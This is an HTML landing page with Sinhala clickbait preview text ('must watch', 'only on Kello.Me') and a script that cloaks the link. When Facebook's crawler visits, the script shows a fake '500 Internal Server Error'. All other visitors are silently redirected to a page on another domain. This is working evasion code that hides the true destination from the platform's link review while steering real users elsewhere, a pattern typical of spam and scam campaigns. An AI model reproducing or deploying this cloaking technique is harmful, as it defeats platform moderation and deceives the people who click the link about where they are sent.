<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Access Control</title>
    <!-- Open Graph Metadata -->
    <meta property="og:title" content="බලන්නම ඕන එකක් 🔥❤️">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://kello.me/jilhub/landing.php">
    <meta property="og:image" content="https://jil.kello.me/ogimages/image_1751820386_686aa86254673.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:description" content="මේවා ආයේ වෙන කොහෙවත් නැහැ. Kello.Me එකෙන් විතරයි 🔴🔥">
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;
            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }
            // Otherwise, redirect to a random page
            const pages = [
                "https://whatyouwant.website/articles/referrer_test.php",
                "https://whatyouwant.website/articles/referrer_test.php"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>

</html>
